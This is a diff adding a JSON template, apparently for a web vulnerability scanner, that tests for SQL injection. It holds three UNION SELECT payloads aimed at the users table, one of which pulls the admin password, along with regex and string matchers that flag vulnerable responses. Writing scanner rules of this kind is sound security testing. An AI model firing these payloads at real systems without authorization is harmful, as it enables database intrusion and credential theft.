@@ -1,0 +1,32 @@
+{
+    "id": "sqli",
+    "severity": "high",
+    "request": {
+        "headers": {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Encoding": "gzip, deflate",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Connection": "keep-alive",
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2"
+        },
+        "payloads": [
+            "1 UNION SELECT * FROM users WHERE id = 1--",
+            "1 UNION SELECT password FROM users WHERE username = 'admin'--",
+            "1 UNION SELECT email FROM users WHERE id = 1--"
+        ]
+    },
+    "stopAtMatch": true,
+    "matchers-condition": "or",
+    "matches": [
+        {
+            "type": "regex",
+            "part": "body",
+            "regex": "\\bUNION\\b.+\\bSELECT\\b.+\\bFROM\\b"
+        },
+        {
+            "type": "exact",
+            "part": "body",
+            "string": "Syntax error"
+        }
+    ]
+}
